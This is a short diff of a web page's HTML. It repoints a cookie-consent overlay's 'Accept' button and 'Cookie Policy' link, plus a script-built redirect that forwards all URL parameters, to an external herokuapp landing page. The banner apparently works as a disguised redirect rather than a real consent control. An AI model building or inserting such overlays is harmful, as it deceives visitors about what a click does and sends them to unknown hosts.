@@ -753,7 +753,7 @@
     <script src="assets/js/script.js"></script>
 	  <script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://ondigitalocean.app/";
+	            const redirectUrl = "https://ip4a-3fdeea4a8fe2.herokuapp.com/landingpage/";
 
 	            // >>> ADD: build redirect URL with ALL current parameters
 	            const buildRedirectUrlWithParams = () => {
@@ -850,7 +850,7 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="https://ip4a-3fdeea4a8fe2.herokuapp.com/landingpage/" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
@@ -949,6 +949,7 @@ referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
   </body>
 </html>
+
 
 
 
